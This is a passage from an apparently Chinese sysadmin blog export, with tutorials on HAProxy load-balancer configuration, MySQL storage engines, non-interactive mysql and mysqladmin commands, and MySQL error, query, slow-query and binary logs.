redispatch\t#\u0026lt;==当与后端服务器的会话失败(服务器故障或其他原因)时, 把会话重新分发到其他健康的服务器上; 当故障服务器恢复时, 会话又被定向到已恢复的服务器上; retries 3 #\u0026lt;==在判定会话失败时的尝试连接的次数 option abortonclose #\u0026lt;==当haproxy负载很高时, 自动结束掉当前队列处理比较久的连接. timeout http-request 10s #\u0026lt;==默认http请求超时时间 timeout queue 1m\t#\u0026lt;==默认队列超时时间, 后端服务器在高负载时, 会将haproxy发来的请求放进一个队列中. timeout connect 5s\t#\u0026lt;==haproxy与后端服务器连接超时时间. timeout client 1m\t#\u0026lt;==客户端与haproxy连接后, 数据传输完毕, 不再有数据传输, 即非活动连接的超时时间. timeout server 1m\t#\u0026lt;==haproxy与后端服务器非活动连接的超时时间. timeout http-keep-alive 10s #\u0026lt;==默认新的http请求连接建立的超时时间，时间较短时可以尽快释放出资源，节约资源. timeout check 10s\t#\u0026lt;==心跳检测超时时间 maxconn 2000\t#\u0026lt;==最大并发连接数 #设置默认的负载均衡方式 #balance source #balnace leastconn listen admin_status # 统计页面配置, frontend和backend的组合体。 # 监控组的名称可按需自定义 mode http #\u0026lt;==监控运行模式 bind 0.0.0.0:80\t#\u0026lt;==统计页面访问端口 maxconn 10 #\u0026lt;==统计页面默认最大连接数 option httplog #\u0026lt;==#http日志格式 stats enable #\u0026lt;==开启web统计 stats hide-version #\u0026lt;==隐藏统计页面上的haproxy版本信息 stats refresh 30s\t#\u0026lt;==监控页面自动刷新时间 stats uri /admin?status #\u0026lt;==统计页面访问url stats auth admin:111\t#\u0026lt;==监控页面的用户和密码:admin, 可设置多个用户名 stats realm hellow world #\u0026lt;==统计页面密码框提示文本 stats admin if TRUE\t#\u0026lt;==手工启动/禁用后端服务器, 可通过web管理节点 #设置haproxy错误页面 #errorfile 400 /usr/local/haproxy/errorfiles/400.http #errorfile 403 /usr/local/haproxy/errorfiles/403.http #errorfile 408 /usr/local/haproxy/errorfiles/408.http #errorfile 500 /usr/local/haproxy/errorfiles/500.http #errorfile 502 /usr/local/haproxy/errorfiles/502.http #errorfile 503 /usr/local/haproxy/errorfiles/503.http #errorfile 504 /usr/local/haproxy/errorfiles/504.http option forwardfor #\u0026lt;==将用户的IP转发给监控的IP option httpchk HEAD /check.html HTTP/1.0 #\u0026lt;==http的健康检查 frontend WEB_SITE #\u0026lt;==vip bind *:80 mode http log global option httplog option httpclose \u0026lt;== http7层代理专用 default_backend WWW backend WWW #\u0026lt;==real server option forwardfor header X-REAL-IP option httpchk HEAD / HTTP/1.0 \u0026lt;==检查real server是否存活的方式，[get post head] server web1 10.0.0.3:80 check inter 2000 rise 30 fall 15 server web2 www.test.com check inter 2000 rise 30 fall 15 # inter为检查间隔 rise为连续30次检查成功则认为有效的。 # fall为连续15次检查失败则认为宕机 haproxy日志配置 CentOS 5.X\n编辑/etc/syslog.conf增加如下配置\nlocal0.* /app/haproxy/logs/haproxy.log CentOS 6 \u0026amp; 7\nlocal0.* -/app/haproxy/logs/haproxy.log # 将local0设备的日志定向到haproxy.log因为haproxy使用的local0 注：使用了local0设备需要将 local0 在 /var/log/message 里制空，否则会记录双份\n*.info;mail.none;authpriv.none;cron.none;local0.none; /var/log/messages 修改/etc/sysconfig/syslog\n#-r enables logging from remote machines # -x disables DNS lookups on messages recieved with -r SYSLOGD_OPTIONS=\u0026quot;-m 0 -r -c 2\u0026quot; 重启后生效\n/etc/init.d/syslog restart # \u0026lt;== CentOS 5 /etc/init.d/rsyslog restart # \u0026lt;== CentOS 6 systemctl restart rsyslog # \u0026lt;== CentOS 7 http://www.cnblogs.com/aaa103439/p/3537163.html\nhttp://www.cnblogs.com/MacoLee/p/5853413.html\n基于权重的轮训round robin server web1 10.0.0.2 check weight 3 server web1 10.0.0.3 check weight 1 for n in {0..20};do curl 10.0.02;sleep 1 done leastconn\u0026ndash;\u0026gt; 类似于 lvs中 的 wlc\n不过这里只考虑活动连接数，即选择活动连接数少的。另外，最好在长连接会话中使用，如sql,ldap\n负载模式实验 环境准备 IP 地位 10.0.0.2 haproxy 10.0.0.1 real server 1 10.0.0.3 real server 2 TCP负载模式配置 frontend WEB_SITE #\u0026lt;==vip bind *:80 mode tcp log global default_backend WWW backend WWW #\u0026lt;==real server server web1 10.0.0.3:52113 check inter 2000 rise 3 fall 5 server web2 10.0.0.1:52113 check inter 2000 rise 3 fall 5 注意：listen可以看做是frontend与bankend的集合，顾如果使用tcp模式代理的话，不要开启web监控\nTCP代理所出现的问题 tcp模式开启web监控页面出现负载准问题 开启web监控页面的haproxy日志\nMay 19 22:41:02 127.0.0.1 haproxy[2579]: Connect from 192.168.2.1:50820 to 10.0.0.2:80 (WEB_SITE/TCP) May 19 22:41:02 127.0.0.1 haproxy[2579]: Connect from 192.168.2.1:50820 to 10.0.0.2:80 (WEB_SITE/TCP) May 19 22:41:02 127.0.0.1 haproxy[2578]: 192.168.2.1:50821 [19/May/2017:22:41:02.405] admin_status admin_status/\u0026lt;STATS\u0026gt; 0/0/0/0/1 200 16975 - - LR-- 0/0/0/0/0 0/0 \u0026quot;GET /admin?status HTTP/1.1\u0026quot; May 19 22:41:02 127.0.0.1 haproxy[2579]: Connect from 192.168.2.1:50822 to 10.0.0.2:80 (WEB_SITE/TCP) May 19 22:41:02 127.0.0.1 haproxy[2579]: Connect from 192.168.2.1:50822 to 10.0.0.2:80 (WEB_SITE/TCP) May 19 22:41:02 127.0.0.1 haproxy[2579]: 192.168.2.1:50823 [19/May/2017:22:41:02.816] admin_status admin_status/\u0026lt;STATS\u0026gt; 0/0/0/0/1 200 16996 - - LR-- 0/0/0/0/0 0/0 \u0026quot;GET /admin?status HTTP/1.1\u0026quot; 代理ssh负载出现如下问题 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY! Someone could be eavesdropping on you right now (man-in-the-middle attack)! It is also possible that a host key has just been changed. The fingerprint for the RSA key sent by the remote host is 11:f2:f1:05:1e:80:0a:bf:9f:09:20:3f:02:e1:12:b8. Please contact your system administrator. Add correct host key in /root/.ssh/known_hosts to get rid of this message. Offending RSA key in /root/.ssh/known_hosts:1 RSA host key for [10.0.0.2]:80 has changed and you have requested strict checking. Host key verification failed. 出现此问题是因为，登陆ssh时使用的是vip，而真正的server是两个，当登陆第一台server时，将指纹保存到vip，当轮训到第二台时，因为已经保存过其他server的指纹了，会提示指纹改变。所以这个不算是问题\nL7代理实验 frontend WEB_SITE #\u0026lt;==vip bind *:80 mode http option httplog option httpclose log global default_backend WWW backend WWW #\u0026lt;==real server server web1 10.0.0.3:52113 check inter 2000 rise 3 fall 5 server web2 10.0.0.1:52113 check inter 2000 rise 3 fall 5 ACL ACL名称必须由 大小写字母、数字、”-“（破折号）、“_”（下划线）、“.”（点）和 ”:“（冒号）。 ACL名称区分大小写，这意味着 “my_acl” 和 “My_Acl” 是两个不同的ACL。ACL的数量没有强制限制。未使用的不影响性能，他们只是消耗少量的内存。\n注：在http代理模式中uri的请求会被分配到real server的实体路径中\nacl \u0026lt;aclname\u0026gt; \u0026lt;criterion\u0026gt; [flags] [operator] \u0026lt;value\u0026gt; ... 参数说明：\n\u0026lt;aclname\u0026gt; \u0026lt;==ACL名称；\n\u0026lt;criterion\u0026gt;：测试标准，即对什么信息发起测试；测试方式可以由 [flags] 指定的标志进行调整；而有些测试标准也可以需要为其在之前指定一个操作符 [operator]；\nACL的flag：\n-i：在匹配所有后续模式时忽略大小写。 -f：从文件加载模式。 -m：使用特定的模式匹配方法 -n：禁止DNS解析 -M：像地图文件一样加载-f指向的文件。 \u0026ndash; ：强制结束标志。 当字符串看起来像其中一个标志时很有用。 -u：强制ACL的唯一ID \u0026lt;value\u0026gt;：acl测试条件支持的值有以下四类：\n整数或整数范围：如 1024:65535 表示从 1024~65535；仅支持使用正整数(如果出现类似小数的标识，其为通常为版本测试)，且支持使用的操作符有5个，分别为eq、ge、gt、le和lt； 字符串：支持使用 “-i” 以忽略字符大小写，支持使用 “\\” 进行转义；如果在模式首部出现了-i，可以在其之前使用“–”标志位； 正则表达式：其机制类同字符串匹配； IP地址及网络地址 常用的测试标准(criteria)\nbe_sess_rate(backend) \u0026lt;integer\u0026gt; 用于测试指定的backend上会话创建的速率(即每秒创建的会话数)是否满足指定的条件；常用于在指定backend上的会话速率过高时将用户请求转发至另外的backend，或用于阻止攻击行为。\n例如：\nacl being_scanned be_sess_rate gt 50 # \u0026lt;==此方案是定义在backend里的 redirect location /error_pages/denied.html if being_scanned sd\nfe_sess_rate(frontend) \u0026lt;integer\u0026gt; 用于测试指定的frontend(或当前frontend)上的会话创建速率是否满足指定的条件；\n常用于为frontend指定一个合理的会话创建速率的上限以防止服务被滥用。例如下面的例子限定入站邮件速率不能大于50封/秒，所有在此指定范围之外的请求都将被延时50毫秒。\nfrontend mail bind :25 mode tcp maxconn 500 acl too_fast fe_sess_rate ge 50 tcp-request inspect-delay 50ms tcp-request content accept if ! too_fast tcp-request content accept if WAIT_END hdr \u0026lt;string\u0026gt;\n用于测试请求报文中的所有首部或指定首部是否满足指定的条件；指定首部时，其名称不区分大小写，且在括号 “()” 中不能有任何多余的空白字符。测试服务器端的响应报文时可以使用 shdr()。例如下面的例子用于测试首部Connection的值是否为close。\nacl url_bao hdr(Host) -i www.baidu.com method \u0026lt;string\u0026gt;\n测试HTTP请求报文中使用的方法。\nfront test use_backend front acl me method get default_backend back backend front server web01 10.0.0.1:8080 check port 8080 inter 5000 fall 5 backend back server w1 10.0.0.3:8080 check port 8080 inter 5000 fall 5 path_beg \u0026lt;string\u0026gt;\n用于测试请求的URL是否以指定的模式开头。\n下面的例子用于测试URL是否以/static、/images、/javascript或/stylesheets头。\nacl url_static path_beg -i /static /images /javascript /stylesheets path_end \u0026lt;string\u0026gt;\n用于测试请求的URL是否以指定的模式结尾。\n例如，下面的例子用户测试URL是否以jpg、gif、png、css或js结尾\nacl url_static path_end -i .jpg .gif .png .css .js hdr_beg \u0026lt;string\u0026gt;\n用于测试请求报文的指定首部的开头部分是否符合指定的模式。\n例如，下面的例子用记测试请求是否为提供静态内容的主机img、video、download或ftp。\nacl host_static hdr_beg(host) -i img. video. download. ftp. 请求uri中包含static\nacl timetask_req url_dir -i timetask 请求头长度\nacl cl hdr_cnt(Content-length) eq 0 web stats 添加一个 frontend\nfrontend stats # 必填参数，默认无法访问 mode http # 统计页面访问端口 bind 0.0.0.0:1080 # 统计页面默认最大连接数 maxconn 10 # http日志格式 option httplog # 开启web统计 stats enable # 隐藏统计页面上的haproxy版本信息 stats hide-version # 监控页面自动刷新时间 stats refresh 30s # 统计页面访问url stats uri /admin?status # 监控页面的用户和密码:admin, 可设置多个用户名 stats auth admin:111 # 统计页面密码框提示文本,某些浏览器不适合中文 stats realm mCloud\\ Haproxy # 手工启动/禁用后端服务器, 可通过web管理节点 stats admin if TRUE socat动态操作haproxy socat是一个多功能的网络工具软件，名字来由是”Socket CAT”，功能与netcat类似，可以看做netcat的加强版。\n配置haproxy\nstats socket /app/haproxy/var/run/haproxy.sock mode 600 level admin stats timeout 2m 安装socat\nyum install socat -y 远程操作haproxy\nsocat帮助\necho help|socat stdio /app/haproxy/var/run/haproxy.sock 上线测试摘取集群节点\necho disable server back/w1 |socat stdio /app/haproxy/var/run/haproxy.sock echo enable server back/w1 |socat stdio /app/haproxy/var/run/haproxy.sock ","permalink":"https://www.oomkill.com/2017/11/haproxy/","summary":"","title":"详解haproxy"},{"content":"什么是存储引擎 在经清楚什么是存储引擎之前，我们先来个比喻，我们都知道录制一个视频文件，可以转换成不同的格式如mp4 avi wmv等，而存在我们电脑的磁盘上也会存在于不同类型的文件系统中如windows里常见的ntfs fat32，存在于linux常见的ext3 ext4 xfs，但是，给我们或者用户看到实际视频内容都是一样的。直观区别是，占用系统的空间大小与清晰程度可能不一样。\n那么数据库表里的数据存储在数据库里及磁盘上和上述的视频格式及存储磁盘文件系统格式特征类似，也有很多中存储方式。\n但是，对于用户和应用程序来说同样一张表的数据，无论用什么引擎来存储，用户看到的数据都是一样的。不同的引擎存储，引擎功能，占用的空间大小，读取性能等可能有区别。\nMySQL最常用的存储引擎为：MyISAM和InnoDB。全文索引：目前MySQL5.5版本，myisam和inondb都已经支持。\nMySQL存储引擎的架构 MySQL的存储引擎是MySQL数据库的重要组成部分，MySQL常用的表的引擎为MyISAM和InnoDB两种。MySQL的每种存储引擎在MySQL里是通过插件的方式使用的，MySQL可以同时支持多种存储引擎。下面是MySQL存储引擎体系结构简图：\nMyISAM引擎 MyISAM引擎是MySQL关系数据库管理系统的默认存储引擎（MySQL 5.5.5以前）。这种MySQL表存储结构从旧的ISAM代码扩展出许多有用的功能。在新版本MySQL中，InnoDB引擎由于其对事务参照完整性，以及更高的并发性等优点开始逐步的取代MyISAM引擎，\n“InnoDB is the default storage engine as of MySQL 5.5.5。MyISAM: The MySQL storage engine that is used the most in Web,data warehousing,and other application environments.MyISAM is supported in all MySQL configurations,an is the default storage engine prior to MySQL 5.5.5。”\n查看MySQL5.1数据库默认引擎\nmysql\u0026gt; show create table test1\\G *************************** 1. row *************************** Table: test1 Create Table: CREATE TABLE `test1` ( `name` int(11) DEFAULT NULL ) ENGINE=MyISAM DEFAULT CHARSET=latin1 1 row in set (0.00 sec) 提示：MySQL 5.1数据库的默认存储引擎为MyISAM。\n每一个MyISAM的表都对应于硬盘上的三个文件。这三个文件有一样的文件名，但是有不同的扩展名指示其类型用途：\n.frm文件保存表的定义，这个文件并不是MyISAM引擎的一部分，而是服务器的一部分\n.MYD保存表的数据\n.MYI是表的索引文件。\n# MYD和MYI是MyISAM的关键点\n范例\n$ ll /var/lib/mysql/mysql/ user.frm\t# 表的定义 user.MYD\t# data user.MYI\t# index MySQL系统的表多数属于MyISAM引擎\n$ ls /var/lib/mysql/mysql/ columns_priv.frm help_keyword.frm proc.frm time_zone_leap_second.MYI columns_priv.MYD help_keyword.MYD proc.MYD time_zone.MYD columns_priv.MYI help_keyword.MYI proc.MYI time_zone.MYI “为什么MySQL5.5.5以前默认的是MyISAM引擎，而MySQL5.5.5以后默认是innodb”\n答：和互联网发展有关，互联网诞生之初。基本上已读为主，那时机器硬件性能低。设计数据库时需要占用资源少的数据库。5.5之后选择了innodb\n“为什么mysql库里内部表默认是myisam”\nweb2.0时代：以用户为中心的时代多数平台都是用户上传其他用户读）在这种时代myisam引擎就胜任不了了，顾mysql5。\nMyISAM引擎特点 至少掌握5点\n不支持事务 事务是指逻辑上的一组操作，组成这组操作的各个单元，要么全成功要么全失败\n表级锁定 数据更新时锁定整个表：其锁定机制是表级锁定，这虽然可以让锁定的实现成本很小但是也同时降低了其开发性能\n举例子：上厕所，还有很多小便坑，锁上外面的们，一个人上厕所，谁也去不了厕所了。\n表级锁定并发处理降低，但是提升了效率 举例：商场有小偷，不知道在哪，锁住一楼大门，然后逐一摸排\n缺点是，别人想出出不去了。但是对于保安来说是最有效的方法。\n读写互相阻塞 不仅会在写入的时候阻塞读取，myisam还会在读取的时候阻塞写入，但读本身并不会阻塞另外的读\n只会缓存索引 MyISAM可以通过key_buffer_size（只是myisam）缓存索引，以大大提高访问性能较少磁盘IO，但这个缓存区只会缓存索引，而不会缓存数据\n读取速度较快。占用资源相对少。\n不支持外键约束，但支持全文索引。\nMyISAM引擎是MySQL5.5.5 前默认的存储引擎 ( “is the default storage engine prior to MySQL 5.5.5” )。\nMyISAM引擎适用的生产业务场景 不需要事务支持的业务（例如转账就不行）。 一般为读数据比较多的应用，读写都频繁场景不适合，读多或者写多的都适合。 读写并发相对较低的业务（纯读纯写高并发也可以）（锁机制问题）。 数据修改相对少的业务（阻塞问题）。 已读为主的业务，例如：读数据库系统表、www blog 图片信息数据库 用户数据库 商品库等业务。 对数据一致性要求不是非常高的业务（MySQL 5.6前不支持事务）。 硬件资源比较差的机器都可以用myisam（占用资源少）。 使用读写分离的MySQL从库可以使用myisam（5年前提到较多） 小结：单一对数据库的操作都可以使用myisam，所谓单一就是尽量纯读，或纯写（insert update delete）等\nInnoDB引擎 Innodb引擎是MySQL数据库的另一个重要的存储引擎，正式成为MySQLAB所发行新版的标准，被包含在所有二进制安装包里。和其他的存储引擎相比，InnoDB引擎的优势是支持兼容ACID的事务（类似于PostgreSQL），以及参数完整性（即对外键的支持）。Oracle公司2005年手抽了Innobase。innobase采用双认证授权。它使用GNU发型，也允许其他想将InnoDB结合到商业软件的团体获得授权。\n更多参考 reman-5.5-en.html-chapter/storage-engines.html\n提示：只有test1.frm没有MyISAM对应的数据文件和索引文件了。\n$ ll test/ ibdata1 ib_logfile0 # ib_logfile1\t# 这里是存放Innodb数据文件 ib_logfile2 # test1.frm\ttest2.frm InnoDB引擎特点 支持事务：支持4个事务隔离级别，支持多版本读。 行级锁定（更新时一般是锁定当前行）：通过索引实现，全表扫描仍然会是表锁，注意间隙锁的影响。 读写阻塞与事务隔离级别相关。 具有非常搞笑的缓存特性：能缓存索引，也能缓存数据。 整个表和主键以Cluster方式存储，组成一颗平衡树。 所有Secondary Index都会保存主键信息。 支持分区，表空间，类似oracle数据库 支持外键约束，5.5前不支持全文索引 和MyISAM引擎比，InnoDB对硬件资源要求更高 面试必问\ninnodb特点：面试必答项：\nrow-level locking full-text search indexs data caches index caches transactions 占用资源多 读写阻塞与事务隔离级别相关 外键 innodb引擎使用的生产业务场景 需要事务支持的业务（具有较好的事务特性）。 行级锁定对高并发有很好的适应能力，但需要确保查询是通过索引完成。 数据读写及更新都较为频繁的场景，如:BBS SNS 微博，微信等。 数据一致性要求较高的业务，例如：充值转账，银行卡转账。 硬件设备内存较大，可以利用InnoDB较好的缓存能力来提高内存利用率，尽可能减少磁盘IO innodb_additional_mem_pool_size = 4M innodb_buffer_pool_size = 32M innodb_data_file_path = ibdata1:128M:autoextend innodb_file_io_threads = 4 innodb_thread_concurrency = 8 innodb_flush_log_at_trx_commit = 2 innodb_log_buffer_size = 2M innodb_log_file_size = 4M innodb_log_files_in_group = 3 innodb_max_dirty_pages_pct = 90 innodb_lock_wait_timeout = 120 innodb_file_per_table = 0 共享表空间对应物理数据文件\n$ ll test/ ibdata1 ib_logfile0 独立表空间对应物理数据文件\ninnodb_file_per_table innodb_data_home_dir=xxx innodb引擎调优精要 主键尽可能小，避免给Secondary index带来过大的空间负担\n建立有效索引避免全表扫描，因为会使用表锁。\n尽可能缓存所有的索引和数据，提高相应速度，减少磁盘IO消耗\n在大批量小插入的时候，尽量自己控制事务而不要使用autocommit自动提交。有开关可以控制提交方式；\n合理设置innodb_flush_log_at_trx_commit参数值，不要过度追求安全性。\n如果innodb_flush_log_at_trx_commit的值为0，log buffer每秒就会被刷写日志文件到磁盘，提交事务时候不做任何操作。\n避免主键更新。（字段的起名长短都会影响性能）。\nMySQL引擎特别说明 Feature MyISAM Memory InnoDB Archive NDB Storage limits 256TB RAM 64TB None 384EB Transactions No No Yes No Yes Locking granularity Table Table Row Row Row MVCC No No Yes No No Geospatial data type support Yes No Yes Yes Yes Geospatial indexing support Yes No Yes[a] No No B-tree indexes Yes Yes Yes No No T-tree indexes No No No No Yes Hash indexes No Yes No[b] No Yes Full-text search indexes Yes No Yes[c] No No Clustered indexes No No Yes No No Data caches No N/A Yes No Yes Index caches Yes N/A Yes No Yes Compressed data Yes[d] No Yes[e] Yes No Encrypted data[f] Yes Yes Yes Yes Yes Cluster database support No No No No Yes Replication support[g] Yes Yes Yes Yes Yes Foreign key support No No Yes No No Backup / point-in-time recovery[h] Yes Yes Yes Yes Yes Query cache support Yes Yes Yes Yes Yes Update statistics for data dictionary Yes Yes Yes Yes Yes [a] InnoDB support for geospatial indexing is available in MySQL 5.7.5 and higher. [b] InnoDB utilizes hash indexes internally for its Adaptive Hash Index feature. [c] InnoDB support for FULLTEXT indexes is available in MySQL 5.6.4 and higher. [d] Compressed MyISAM tables are supported only when using the compressed row format. Tables using the compressed row format with MyISAM are read only. [e] Compressed InnoDB tables require the InnoDB Barracuda file format. [f] Implemented in the server (via encryption functions). Data-at-rest tablespace encryption is available in MySQL 5.7 and higher. [g] Implemented in the server, rather than in the storage engine. [h] Implemented in the server, rather than in the storage engine. 参考手册：https://dev.mysql.com/doc/refman/5.5/en/storage-engines.html\n以上是myisam innodb和NDBCluster三个存储引擎是目前互联网公司应用比较多的存储引擎，特别是前两者，其他如 memory merge csv archive等存储引擎的使用场景都相对较少，初学的同学可以暂时忽略。更多可参考MySQL官方文档。\n如何确定MySQL服务器有那些引擎可用？ 在MySQL中使用显示引擎的命令得到一个可用引擎的列表\nshow engines\\G ... ... *************************** 5. row *************************** Engine: MyISAM Support: YES Comment: MyISAM storage engine Transactions: NO XA: NO Savepoints: NO *************************** 6. row *************************** Engine: InnoDB Support: DEFAULT Comment: Percona-XtraDB, Supports transactions, row-level locking, and foreign keys Transactions: YES XA: YES Savepoints: YES ... ... 10 rows in set (0.01 sec) 生产场景中批量更改MySQL引擎 一般来说这样的需求不多见，但偶尔也会有，在这里我们推荐使用sed对备份内容进行引擎转换的方式，当然，不要忘记修改my.cnf使之支持并能高效的使用对应的引擎\n方法1：MySQL命令语句修改\nalter table test engine=innodb; 方法2：使用sed对备份内容进行引擎转换\n# 此方法折腾数据不推荐使用 # 主从复制丛库换引擎，正式数据换不要用 sed -e 's#MyISAM#InnoDB#g' b.sql\u0026gt;b1.sql 方法3：mysql_convert_table_format命令修改\nmysql_convert_table_format --host=$HOST --user=$USER --passsword=$PASS --socket=$SOCKET --type=$Engine $DB $TN 建表语句加上指定引擎：\ncreate table test( id int not null ) engine=innodb default charset=utf8; 混合引擎和单独innodb引擎配置差别？\n有关MySQL引擎常见企业面试题 MySQL有那些存储引擎，各自有什么特点和区别？ 生产环境中如何选用MySQL的引擎 ​\t在一般的既有读又有写的业务中，建议使用innodb引擎，一句话尽可能多的使用innodb引擎。\n​\t纯读 纯写可用myisam。例如系统的MySQL库。\n不同引擎如何备份？混合引擎如何备份。\n# myisam mysqldump -uroot -p111 -S/data/3306/mysql.sock \\ -A \\ -x \\ -B \\ -F \\ --master-data=2|gzip \u0026gt;back.sql # innodb mysqldump -uroot -p111 -S/data/3306/mysql.sock \\ -A \\ -x \\ -B \\ -F \\ --master-data=2 \\ --single-transaction|gzip \u0026gt;back.sql ","permalink":"https://www.oomkill.com/2017/05/ch8-mysql-engine/","summary":"","title":"ch08 - MySQL存储引擎"},{"content":"利用 mysql -e 参数查看 mysql 数据 $ mysql -uroot -p111 -e 'use test;show tables;' +------------------------------+ | Tables_in_test | +------------------------------+ | 33hao_activity | | 33hao_activity_detail | | 33hao_address | +------------------------------+ 利用 mysql -e 参数查看SQL线程执行状态\n$ mysql -uroot -p111 -e 'show processlist;' kill 12; 查看完整的线程状态，此参数才查看慢查询语句是非常有用\n解决方法：\nroot@localhost [test]\u0026gt;show variables like '%_timeout%'; # 设置 set global wait_timeout=60; set global interactive_timeout=60; 在配置文件里修改 set global wait_timeout=60; set global interactive_timeout=60; # 此参数设置后wait_timeout自动生效 其他方法 (1) PHP程序中，不适用持久链接，即 mysql_connect 而不是 pconnect（java调整连接池）\n(2) PHP程序执行完毕，应该显示调用 mysql_close()\n(3) 逐步分析MySQL的SQL查询及慢查询日志，找到查询过慢的SQL，优化。\n利用mysql -e查看mysql变量及性能状态\n$ mysql -uroot -p111 -e 'show variables;'|head -5 Variable_name Value auto_increment_increment 1 auto_increment_offset 1 autocommit ON automatic_sp_privileges ON 不重启数据库就该数据库参数\n要求：重启后还能生效\n$ sed -n '122p' /etc/my.cnf key_buffer_size = 16M $ sed -i 's#key_buffer_size = 16M#key_buffer_size=32M#g' /etc/my.cnf $ sed -n '122p' /etc/my.cnf key_buffer_size=32M 生产环境常用重要命令小结\n# 查看数据库里正在执行的SQL语句，可能无法看完整SQL语句 show processlist; # 查看正在执行的完整SQL语句，完整显示 show full processlist; # 不重启数据库调整数据库参数，直接生效，重启后失效 set gloables key_buffer_size=1024*1024*32; # 查看数据库的配置参数信息，例如：my.cnf里参数的生效情况。 show variables; # 杀掉SQL线程的命令ID为线程号 kill id # 查看当前会话的数据库状态信息 show session status; # 查看整个数据库运行状态信息，很重要，要分析并要做好监控 show global status; # 显示innodb引擎的性能状态（早期show innodb status） show engine innodb status; 计算一天之内：MySQL数据库有多少 insert delect语句，有没有好办法？\n定时任务每天0点，show global status; 按天取出对比。\n按天分析binlog日志，获取数据库不同语句的频率。\nmysqladmin命令\n# 修改密码 mysqladmin password 111 mysqladmin -uroot -p111 password 222 # 查看状态 mysqladmin -uroot -p111 status mysqladmin -uroot -p111 extended-status show global status mysqladmin -uroot -p111 -S /data/3306/mysql.sock -i status # 刷新日志 mysqladmin -uroot -p111 flush-logs mysqladmin -uroot -p111 processlist # 实时跟踪 mysqladmin -uroot -p111 processlist -i 1 # 关闭mysql mysqladmin -uroot -p111 -S /data/3306/mysql.sock shutdown mysqladmin -uroot -p111 -S /data/3306/mysql.sock variables show vaiables ","permalink":"https://www.oomkill.com/2017/05/ch7-mysql-non-interact/","summary":"","title":"ch07 - 实现和MySQL非交互式对话"},{"content":"错误日志 error log MySQL错误日志记录MySQL服务进程mysqld在启动/关闭或运行过程中遇到的错误信息\n错误日志配置\n在配置文件中调整方法，当然可以在启动时加入启动参数\n[mysqld_safe] log-error=/data/3306/mysql_3306.err 启动MySQL命令里加入\n/app/mysql/bin/mysqld_safe \\ --defaults-file=/data/3306/my.cnf \\ --log-error=/data/3306/mysql_3306.err MariaDB\u0026gt; show variables like \u0026quot;%log_error%\u0026quot;; +-------------------+---------------------------+ | Variable_name | Value\t| +-------------------+---------------------------+ | log_error | /data/3306/mysql_3306.err | +-------------------+---------------------------+ 遇到数据库启动不了\n先把日志文件备份并清空启动一下mysql服务后再查看日志文件，看报有什么错误\nInnoDB: The error means mysqld does not have the access rights to InnoDB: the directory 然后查看mysql3306目录下文件权限\n普通查询日志 general query log 普通查询日志 (general query log)：记录客户端链接信息和执行的SQL语句信息。\n普通查询日志配置\nMariaDB\u0026gt; show variables like \u0026quot;%general_log%\u0026quot;; +------------------+-----------+ | Variable_name | Value | +------------------+-----------+ | general_log | OFF | | general_log_file | lnmp.log | +------------------+-----------+ 临时生效\nMariaDB\u0026gt; set global general_log_file = '/data/3306/log/mysql_query.log'; MariaDB\u0026gt; set global general_log='on'; MariaDB\u0026gt; show variables like '%general_log%'; +-------------------+----------------------------------+ | Variable_name | Value | +-------------------+----------------------------------+ | general_log | ON | | general_log_file | /data/3306/log/mysql_query.log | +-------------------+----------------------------------+ 永久生效\n$ grep general /data/3306/my.cnf general_log=on general_log_file=/data/3306/log/mysql_query.log 日志示例\ncat log/mysql_query.log /app/mysql/bin/mysqld, Version: 5.5.54-MariaDB (MariaDB Server). started with: Tcp port: 3306 Unix socket: /data/3306/mysql.sock Time Id\tCommand Argument 170130 8:55:03 1 Connect root@localhost as anonymous on 1 Query select @@version_comment limit 1 170130 8:55:18 1 Query show variabales 170130 8:55:44 2 Connect root@localhost as anonymous on 2 Query KILL QUERY 1 2 Quit 慢查询日志 slow query log 慢查询日志 (slow query log)：记录执行时间超出指定值 long_query_time的SQL语句\n慢查询日志调整\nlong_query_time=1 log-slow-queries=/data/3306/log/mysql_slow.log log_queries_not_using_indexes 慢查询的设置，对于数据库SQL的优化非常重要\n$ egrep que ../my.cnf long_query_time = 2 log-slow-queries = /data/3306/log/slow.log log_queries_not_using_indexes 利用慢查询进行优化解决方案 开启慢查询\nlong_query_time = 2 log-slow-queries = /data/3306/log/slow.log log_queries_not_using_indexes 慢查询日志切割\n#!/bin/sh cd /data/3306/ \u0026amp;\u0026amp;\\ /bin/mv slow.log slow.log.$(date +%F)\u0026amp;\u0026amp;\\ mysqladmin -uroot -p111 -S /data/3306/mysql.sock flush-log 00 00 * * * /bin/sh /server/scripts/cut_slow_log.sh \u0026amp;\u0026gt; /dev/null 使用mysqlsla分析慢查询，定时发给相关人员信箱\n使用explain优化SQL语句（select） 抓SQL慢查询语句\nshow full processlist; mysql -uroot -p111 -S /data/3306/mysql.sock -e \u0026quot;show full processlist;\u0026quot;|egrep -vi \u0026quot;sleep\u0026quot; explain语句检查索引执行情况\nexplain select * from test where name='123'\\G; explain select SQL_NO_CACHE * from test where name='123'\\G 对需要建立索引的条件列建立索引\n大表不能高峰期建立索引，300w记录\n分析慢查询的工具mysqlsla\n二进制日志 binary log 二进制日志 (binary log)：用来记录mysql内部增删改等对mysql数据库有更新的内容的记录（对数据库的改动），对数据库查询的语句如：show、select开头的语句，不会被binlog日志记录，用于数据库的增量恢复，以及主从复制\n$ ls mysql-bin.000002 mysql-bin.000004 mysql-bin.000001 mysql-bin.000003 mysql-bin.index 面试题：在MySQL数据库中，关于binlog日志，下列说法正确的是 ___ ?( A )\nA. 依靠足够长度的binlog日志和定期的全备，我们可以恢复任何时间点的单表数据。\nB. 以mysql主从同步为例，binlog中会记录主数据库进行的所有操作。\nC. 以mysql主从同步为例，binlog中会记录主数据库进行的所有查询操作。\nD. binlog通过cat和vi无法查看，但可以通过gedit查看\n开启mysql的binlog功能\nlog-bin=/data/3306/mysql-bin max_binlog_cache_size = 5M max_binlog_size = 20M mysqlbinlog工具解析binlog日志\n默认情况binlog日志是二进制格式的，不能使用查看文本工具的命令查看，例如 cat vi等\n$ file mysql-bin.000004 mysql-bin.000004: MySQL replication log $ cat mysql-bin.000004 \u0012\u0004\u0004\u0004\u0002I\u0008.5.54-MariaDBlog*ȎX\u00138 